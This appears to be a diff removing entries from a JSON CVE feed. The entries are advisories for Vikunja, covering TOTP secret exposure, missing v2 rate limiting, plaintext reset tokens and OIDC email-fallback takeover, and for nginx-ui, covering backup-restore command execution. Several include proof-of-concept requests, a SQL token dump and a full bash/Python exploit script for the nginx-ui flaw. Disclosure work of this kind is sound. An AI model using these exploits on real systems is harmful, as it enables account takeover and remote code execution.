-        "http://www.securityfocus.com/bid/5666"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91982",
-      "summary": "### Summary\nOnce a user has TOTP enabled, the API still hands back the raw shared secret to anyone holding that account's access token. Reading it doesn't ask for the password, even though disabling TOTP does. So a stolen token, an XSS, or a browser left open is enough to copy the second factor into your own authenticator and keep generating valid codes indefinitely.\n\n### Details\n`GET /api/v1/user/settings/totp` returns the full TOTP object, including the secret field and the otpauth:// provisioning URL. `GET /api/v1/user/settings/totp/qrcode` renders the same secret as a QR image. Neither requires re-authentication, the access token alone is enough.\n\nThis is inconsistent with the rest of the flow: `POST /api/v1/user/settings/totp/disable` calls CheckUserPassword before it will turn TOTP off. So the destructive action is gated behind the password, but reading out the secret that backs the second factor isn't. There's also no reason for the secret to be readable at all once enrollment is finished, the client only needs it during setup.\n\nThe fix is to stop returning secret/url/the QR code once enabled is true (only expose them during the enrollment window). Requiring the password on the read, like disable already does, would also be reasonable.\n\n### PoC\nThe attacker needs the victim's access token, from an XSS, a leaked/stolen token, or an unlocked session. TOTP must already be enabled on the account.\n\n1. With the victim's bearer token, call:\n```\nGET /api/v1/user/settings/totp\nAuthorization: Bearer <victim_token>\n```\nThe response contains the shared secret and the otpauth:// URL:\n```\n{\"secret\": \"<base32 secret>\", \"enabled\": true, \"url\": \"otpauth://totp/...\"}\n```\n2. Paste that secret (or scan `/api/v1/user/settings/totp/qrcode`) into any authenticator app.\n3. It now produces the same 6-digit codes as the victim's device. Nothing is logged and the victim gets no notification.\n\n### Impact\nThis defeats the purpose of the second factor. 2FA is supposed to survive exactly this situation, a compromised password or a hijacked session, but a single read of the account's own settings hands over the shared secret with no step-up check and no trace. Combined with a known or later-recovered password, it's a durable account takeover that TOTP was meant to prevent.",
-      "cvssScore": 5.3,
-      "severity": "Medium",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-88f6-4rjv-x774",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91982",
-        "https://github.com/go-vikunja/vikunja/pull/3688",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0",
-        "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-totp-secret-disclosure-via-api"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-91972",
-      "summary": "### Summary\n`registerAPIRoutesV2` never applies the unconditional pre-auth rate-limit floor (`unauthRateLimit()`) to the v2 public routes — it passes that limiter only to `/api/v2/ws` — and otherwise relies on `setupRateLimit`, which registers nothing when `ratelimit.enabled` is false (the default). So on a stock install every v2 pre-auth endpoint (login, register, password-reset token, oauth token) is unthrottled, while its v1 twin is throttled.\n\n### Details\n`unauthRateLimit()` -> `perMinuteIPRateLimit(\"noauth\", RateLimitNoAuthRoutesLimit)` (`pkg/routes/rate_limit.go`, ~lines 100-118) is an unconditional per-IP floor (default 10/60s) that deliberately ignores `RateLimitEnabled`, which is why v1's pre-auth routes are throttled even with the global limiter off. v1 applies it: `ur := a.Group(\"\"); ur.Use(unauthRateLimit())` (`pkg/routes/routes.go` ~line 459). `registerAPIRoutesV2` (~lines 405-431) passes the `unauthRateLimit()` instance only to `/api/v2/ws`; its auth routes get only `setupRateLimit(a, ...)`, which is config-gated and registers nothing by default.\n\n### PoC (verified at runtime against v2.5.0)\n```\nPOST /api/v1/login              x25 -> 429 from attempt 5\nPOST /api/v2/login              x25 -> 403 x25, 429 x0\nPOST /api/v1/user/password/token     -> 429 (throttled)\nPOST /api/v2/user/password/token x20 -> 404 x20, 429 x0\n```\nRequest bodies are byte-identical across versions (shared `user.Login` / `user.PasswordTokenRequest`). Both v2 endpoints reach their handlers (403/404, not route-404), so the comparison is valid.\n\n### Impact\nThe pre-auth rate-limit floor — the instance's only default anti-brute-force / anti-abuse control — is absent on all v2 public endpoints. Enables unbounded credential guessing, account-enumeration probing, and password-reset flooding on a default install. Reported as an authentication-control bypass, not a DoS.\n\n### Fix\nApply `unauthRateLimit()` to the v2 public route group, matching v1.",
-      "cvssScore": 8.7,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-307",
-        "name": "Improper Restriction of Excessive Authentication Attempts"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-6rvj-qwjf-3m4q",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-91972",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.6.0",
-        "https://www.vulncheck.com/advisories/vikunja-before-2.6.0-authentication-bypass-via-unthrottled-api",
-        "https://github.com/advisories/GHSA-6rvj-qwjf-3m4q"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-62376",
-      "summary": "### Summary\n\nVikunja stores password-reset, email-confirmation, and account-deletion tokens in the `user_tokens` table in **plaintext**. If an attacker gains read access to the database through a backup leak, misconfigured storage, or SQL-level exposure, they can immediately use pending tokens to take over user accounts without knowing passwords.\n\n### Details\n\n`pkg/user/token.go` — `genToken()` stores the raw random string directly:\n```go\nfunc genToken(u *User, kind TokenKind) (*Token, error) {\n    tokenStr, err := utils.CryptoRandomString(tokenSize)\n    ...\n    return &Token{\n        UserID: u.ID,\n        Kind:   kind,\n        Token:  tokenStr,  // stored as-is, no hashing\n    }, nil\n}\n```\n\nLookup also uses plaintext equality:\n```go\nfunc getToken(s *xorm.Session, token string, kind TokenKind) (t *Token, err error) {\n    has, err := s.Where(\"kind = ? AND token = ?\", kind, token).Get(t)\n}\n```\n\nAffected token types:\n- `TokenPasswordReset` (`pkg/user/user_password_reset.go:120`)\n- `TokenEmailConfirm` (`pkg/user/user_create.go:101`, `pkg/user/update_email.go:88`)\n- `TokenAccountDeletion` (`pkg/user/delete.go:102`)\n\nNote: CalDAV tokens correctly use `generateHashedToken` with bcrypt — the same protection is absent for the above types.\n\n### PoC\n\n```sql\n-- Attacker with DB read dumps all pending password-reset tokens:\nSELECT u.email, t.token FROM user_tokens t\nJOIN users u ON u.id = t.user_id WHERE t.kind = 1;\n\n-- Then takes over any account:\ncurl -X POST https://vikunja.example.com/api/v1/user/password/reset \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"token\": \"<plaintext_from_db>\", \"new_password\": \"AttackerPass1!\"}'\n```\n\n### Impact\n\nAny read access to the database (leaked backup, cloud misconfiguration, secondary SQLi) allows an attacker to take over every user account with a pending reset token within the 24-hour token lifetime. Full account takeover including admin accounts.\n\n### Fix\n\nReplace `genToken` with `generateHashedToken` for `TokenPasswordReset`, `TokenEmailConfirm`, and `TokenAccountDeletion`. Update the corresponding lookup to use bcrypt comparison (`bcrypt.CompareHashAndPassword`) rather than direct SQL equality, mirroring the existing CalDAV token implementation in the same file.\n\nIf possible, please apply for a CVE number when posting.",
-      "cvssScore": 8.1,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-312",
-        "name": "Cleartext Storage of Sensitive Information"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-r6w9-259g-gwrv",
-        "https://github.com/go-vikunja/vikunja/commit/00fd2c6155c01faae99be4226b931d8091fd6323",
-        "https://github.com/go-vikunja/vikunja/commit/3a0ea15d8c18ff960bc98ae39950fa7a14b0af7d",
-        "https://github.com/go-vikunja/vikunja/commit/e31ea2de5040fa63bc97cf4df63bafed3bd9ad85",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-62367",
-      "summary": "## Summary\n\nWith the per-provider OIDC `emailfallback` option enabled, Vikunja links an SSO login to a pre-existing **local** (username+password) account using only the `email` claim — no `email_verified` (or Microsoft `xms_edov`) check and no password check, on the unauthenticated callback. An attacker who can make the configured issuer emit a token bearing a victim's email logs in as that victim with a full session and no victim interaction (the nOAuth / Grafana CVE-2023-3128 class). The 2.3.0 fix for GHSA-8jvc-mcx6-r4cg added a TOTP gate, not an `email_verified` gate, so users without TOTP remain exposed.\n\n## Details\n\nReferences are `pkg/modules/auth/openid/openid.go` at HEAD. Identity is first resolved on the immutable `(issuer, subject)` pair (`openid.go:428`). On a subject miss with `emailfallback` on, `fallbackSearchUsers` adds an email-only lookup against local accounts:\n\n```go\n// openid.go:413\nsearches = append(searches, &user.User{Issuer: user.IssuerLocal, Email: cl.Email})\n```\n\n`getUser` resolves this via `s.Get()`, which ANDs non-zero fields -> `WHERE issuer='local' AND email=?`. Local users always have `Issuer=\"local\"` (`user_create.go:38`), so the lookup matches any local account by email alone; `getOrCreateUser` returns it and the caller mints a session — the password is never read. The `claims` struct has no `email_verified` field (`openid.go:80`) and `getClaims` never consults one; a repo-wide grep for `email_verified`/`xms_edov` returns nothing. The code already warns about this at `openid.go:388` (\"Discouraged for untrusted providers where someone can set email without verification\") — but enforces nothing.\n\n## Impact\n\nUnauthenticated takeover of any existing **local** account (read/write/delete its projects, tasks, attachments, shares), bypassing the password. Scope notes: only `issuer='local'` accounts are matched (not pure-SSO users); the attacker's `sub` is not bound to the victim record, but the attack is repeatable; TOTP users are protected by the 2.3.0 `enforceTOTPIfRequired` gate (`openid.go:250`), non-TOTP users are not.\n\n## Preconditions\n\n1. Admin enabled `emailfallback: true` (defaults false — a default install is unaffected).\n2. The configured issuer lets the attacker assert the victim's unverified email: a self-service IdP (Keycloak/Authentik/Auth0/Dex with editable email), a mixed federation, or a multi-tenant Entra `/common` app. `iss`/`aud` are pinned, but the attacker controls `email`, not the issuer.\n3. The victim has a local account.\n\nNot reachable against a single-tenant IdP that verifies email and disallows self-set addresses.\n\n## Recommended Fix\n\nAdd `email_verified` to the `claims` struct and require it `true` on the email-fallback branch before linking to a local account; reject when absent/false. For Entra also require `xms_edov` and pin multi-tenant configs to an allowed-tenant list. Fail closed on an email collision not backed by a verified email from a trusted single-tenant issuer rather than silently logging the caller in.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-287",
-        "name": "Improper Authentication"
-      },
-      "references": [
-        "https://github.com/go-vikunja/vikunja/security/advisories/GHSA-xv7q-fvmc-jx96",
-        "https://github.com/go-vikunja/vikunja/commit/7854f2729ab72000210b61c25929678fd6901630",
-        "https://github.com/go-vikunja/vikunja/releases/tag/v2.4.0",
-        "https://github.com/advisories/GHSA-xv7q-fvmc-jx96"
-      ],
-      "vulnerableProducts": [
-        "code.vikunja.io/api go"
-      ],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2026-107806",
-      "summary": "## Summary\n\nAn authenticated nginx-ui user can call `POST /api/restore`, upload a forged encrypted backup, restore `app.ini`, set nginx command settings such as `TestConfigCmd`, and then trigger command execution with `POST /api/nginx/test`.\n\nThis was validated on nginx-ui `2.3.11 2(523) 6c86e5a5` in the local Docker container `uozi/nginx-ui:latest`.\n\n## Impact\n\nAn authenticated user can overwrite nginx-ui application configuration and database state through restore, including protected settings that are normally not writable through the settings API. By setting nginx command fields in the restored `app.ini`, the attacker can execute commands in the nginx-ui runtime context. This affects confidentiality, integrity, and availability because the attacker can read or replace secrets, change node/JWT secrets, corrupt application state, and execute arbitrary commands.\n\n## Affected Version / Environment\n\n- Version: `nginx-ui 2.3.11 2(523) 6c86e5a5`\n- Deployment: local Docker, `uozi/nginx-ui:latest`\n- Base URL used in validation: `http://127.0.0.1:8080`\n\n## Root Cause\n\n`/api/restore` is reachable through normal authenticated-user authorization. The restore handler accepts attacker-supplied backup key material, validates the manifest with a key derived from that supplied AES key, decrypts attacker-controlled backup contents, and copies restored `app.ini` into the live nginx-ui config path.\n\nRelevant code paths:\n\n- `api/backup/router.go`: `POST /api/restore`\n- `api/backup/restore.go`: accepts `security_token` and uploaded backup file\n- `internal/backup/manifest.go`: derives backup signing key from supplied AES key\n- `internal/backup/restore.go`: `restoreNginxUIConfig` overwrites live `app.ini`\n- `internal/nginx/exec.go`: nginx command settings execute through shell-backed command paths\n\n## Proof of Concept\n\nAssumptions:\n\n- nginx-ui is already running.\n- `$TOKEN` is a valid user JWT.\n- `$CONTAINER` is the local disposable Docker container name for cleanup and evidence checks.\n\n```bash\nexport BASE='http://127.0.0.1:8080'\nexport TOKEN='<valid nginx-ui JWT>'\nexport CONTAINER='nginx-ui'\n```\n\nRun only against a disposable local instance.\n\n```bash\nset -eu\n\nTMP=$(mktemp -d)\ntrap 'rm -rf \"$TMP\"' EXIT\n\ndocker cp \"$CONTAINER\":/etc/nginx-ui/app.ini \"$TMP/app.ini.original\"\n\ncurl -sS -D \"$TMP/backup.headers\" -o \"$TMP/backup.zip\" \\\n  -H \"Authorization: $TOKEN\" \\\n  \"$BASE/api/backup\"\n\nSEC=$(awk 'BEGIN{IGNORECASE=1} /^X-Backup-Security:/{gsub(\"\\r\",\"\"); print $2}' \"$TMP/backup.headers\")\nKEY_B64=${SEC%%:*}\nIV_B64=${SEC#*:}\nKEY_HEX=$(printf '%s' \"$KEY_B64\" | base64 -d | xxd -p -c 256)\nIV_HEX=$(printf '%s' \"$IV_B64\" | base64 -d | xxd -p -c 256)\n\nmkdir -p \"$TMP/outer\" \"$TMP/inner\"\nunzip -q \"$TMP/backup.zip\" -d \"$TMP/outer\"\nopenssl enc -d -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/outer/nginx-ui.zip\" \\\n  -out \"$TMP/nginx-ui.clear.zip\"\nunzip -q \"$TMP/nginx-ui.clear.zip\" -d \"$TMP/inner\"\n\npython3 - \"$TMP/inner/app.ini\" <<'PY'\nfrom pathlib import Path\nimport sys\n\np = Path(sys.argv[1])\ncmd = \"TestConfigCmd = printf restored-rce >/tmp/nginx-ui-restore-rce\"\nlines = p.read_text().splitlines()\nout = []\nin_nginx = False\nseen_nginx = False\nwritten = False\n\nfor line in lines:\n    s = line.strip()\n    if s.startswith(\"[\") and s.endswith(\"]\"):\n        if in_nginx and not written:\n            out.append(cmd)\n            written = True\n        in_nginx = s.lower() == \"[nginx]\"\n        seen_nginx = seen_nginx or in_nginx\n    if in_nginx and s.startswith(\"TestConfigCmd\"):\n        if not written:\n            out.append(cmd)\n            written = True\n        continue\n    out.append(line)\n\nif in_nginx and not written:\n    out.append(cmd)\nelif not seen_nginx:\n    out.extend([\"\", \"[nginx]\", cmd])\n\np.write_text(\"\\n\".join(out) + \"\\n\")\nPY\n\n(cd \"$TMP/inner\" && zip -qr \"$TMP/nginx-ui.modified.clear.zip\" .)\nopenssl enc -aes-256-cbc -K \"$KEY_HEX\" -iv \"$IV_HEX\" -nosalt \\\n  -in \"$TMP/nginx-ui.modified.clear.zip\" \\\n  -out \"$TMP/outer/nginx-ui.zip\"\n\nOUTER=\"$TMP/outer\" KEY_B64=\"$KEY_B64\" python3 <<'PY'\nfrom pathlib import Path\nimport base64\nimport hashlib\nimport hmac\nimport json\nimport os\n\nouter = Path(os.environ[\"OUTER\"])\nkey = base64.b64decode(os.environ[\"KEY_B64\"])\nmanifest = json.loads((outer / \"manifest.json\").read_text())\n\nfor entry in manifest[\"files\"]:\n    data = (outer / entry[\"name\"]).read_bytes()\n    entry[\"sha256\"] = hashlib.sha256(data).hexdigest()\n    entry[\"size\"] = len(data)\n\nmanifest[\"files\"] = sorted(manifest[\"files\"], key=lambda e: e[\"name\"])\nmanifest_bytes = json.dumps(manifest, separators=(\",\", \":\")).encode()\n(outer / \"manifest.json\").write_bytes(manifest_bytes)\n\nsigning_key = hashlib.sha256(b\"nginx-ui-backup-signing-v1:\" + key).digest()\n(outer / \"manifest.sig\").write_text(hmac.new(signing_key, manifest_bytes, hashlib.sha256).hexdigest())\nPY\n\n(cd \"$TMP/outer\" && zip -qr \"$TMP/malicious-restore.zip\" manifest.sig nginx-ui.zip nginx.zip manifest.json)\n\ncurl -sS -X POST \"$BASE/api/restore\" \\\n  -H \"Authorization: $TOKEN\" \\\n  -F \"restore_nginx=false\" \\\n  -F \"restore_nginx_ui=true\" \\\n  -F \"verify_hash=true\" \\\n  -F \"security_token=$SEC\" \\\n  -F \"backup_file=@$TMP/malicious-restore.zip\"\n\nsleep 10\nfor i in $(seq 1 80); do\n  curl -sS -o /dev/null -H \"Authorization: $TOKEN\" \"$BASE/api/settings\" && break\n  sleep 0.5\ndone\n\ncurl -sS -X POST \"$BASE/api/nginx/test\" \\\n  -H \"Authorization: $TOKEN\"\n\ndocker exec \"$CONTAINER\" sh -lc 'cat /tmp/nginx-ui-restore-rce'\n\n# Cleanup and return the disposable instance to its original config.\ndocker cp \"$TMP/app.ini.original\" \"$CONTAINER\":/etc/nginx-ui/app.ini\ndocker exec \"$CONTAINER\" sh -lc 'rm -f /tmp/nginx-ui-restore-rce'\ndocker restart \"$CONTAINER\"\n```\n\nExpected output:\n\n```text\n{\"nginx_ui_restored\":true,\"nginx_restored\":false,\"hash_match\":true}\n{\"message\":\"\",\"level\":-1,\"test_scope\":\"global\"}\nrestored-rce\n```\n\n## Cleanup\n\nThe PoC performs cleanup at the end. If interrupted, restore the original `app.ini` from a known-good backup, remove `/tmp/nginx-ui-restore-rce`, and restart nginx-ui before continuing other tests.\n\n## Patch Guidance\n\nRequire an elevated/admin secure session for restore, do not allow ordinary authenticated users to restore nginx-ui app state, bind backup manifest signatures to a server-side secret or administrator-held passphrase, and block protected app settings from being restored unless explicitly approved through a hardened migration path.",
-      "cvssScore": 9,
-      "severity": "Critical",
-      "published": "2026-10-09",
-      "modified": "2026-10-09",
-      "cwe": {
-        "cwe_id": "CWE-94",
-        "name": "Improper Control of Generation of Code ('Code Injection')"
-      },
-      "references": [
-        "https://github.com/0xJacky/nginx-ui/security/advisories/GHSA-p393-cf76-4jmr",
-        "https://nvd.nist.gov/vuln/detail/CVE-2026-107806",
-        "https://github.com/0xJacky/nginx-ui/commit/a467ed652591fc0cd1b466a1ec751b493faef9f7",
-        "https://github.com/0xJacky/nginx-ui/releases/tag/v2.5.0",
-        "https://github.com/advisories/GHSA-p393-cf76-4jmr"
-      ],
-      "vulnerableProducts": [
-        "github.com/0xJacky/Nginx-UI go"
-      ],
       "isExploited": false
     }
   ]
